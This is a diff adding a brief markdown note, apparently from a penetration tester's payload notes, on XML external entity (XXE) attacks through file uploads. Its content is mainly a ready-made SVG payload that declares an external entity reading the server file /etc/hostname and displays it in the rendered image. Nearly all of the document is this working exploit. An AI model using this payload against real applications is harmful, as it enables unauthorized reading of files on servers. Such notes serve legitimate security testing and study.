@@ -1,0 +1,15 @@
+#xmli #xxe #file_upload #xml 
+
+If the application process or validate (server-side) uploaded files that use or contain XML (e.g. SVG or DOCX).
+
+## SVG File Upload
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
+    xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+    <text font-size="20" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+Note: Ajust Image and Font size. 
